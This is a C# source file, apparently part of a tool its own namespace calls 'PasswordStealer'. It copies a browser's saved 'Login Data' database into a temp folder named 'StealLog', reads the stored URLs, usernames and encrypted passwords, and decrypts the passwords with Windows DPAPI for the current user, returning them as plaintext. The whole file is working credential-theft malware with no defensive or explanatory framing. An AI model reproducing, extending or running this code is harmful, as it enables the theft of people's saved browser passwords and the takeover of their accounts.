using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Security;

namespace PasswordStealer
{
    public static class Passwords
    {
        public static IEnumerable<Tuple<string, string, string>> ReadPass(string dbPath)
        {
            if (File.Exists(Path.GetTempPath() + @"StealLog\Login Data"))
                    File.Delete(Path.GetTempPath() + @"StealLog\Login Data");

            File.Copy(dbPath, Path.GetTempPath() + @"StealLog\Login Data");
            dbPath = Path.GetTempPath() + @"StealLog\Login Data";

            var connectionString = $"Data Source={dbPath}; pooling=false";

            using (var conn = new System.Data.SQLite.SQLiteConnection(connectionString))
            {
                using (var cmd = conn.CreateCommand())
                {
                    cmd.CommandText = "SELECT password_value,username_value,origin_url FROM logins";
                    conn.Open();
                    using (var reader = cmd.ExecuteReader())
                    {
                        while (reader.Read())
                        {
                            var encryptedData = (byte[])reader[0];
                            var decodedData = System.Security.Cryptography.ProtectedData.Unprotect(encryptedData,
                                null, System.Security.Cryptography.DataProtectionScope.CurrentUser);

                            var plainText = Encoding.ASCII.GetString(decodedData);
                            yield return Tuple.Create(reader.GetString(2), reader.GetString(1), plainText);
                        }
                    }
                    conn.Close();
                }
            }
        }
    }
}
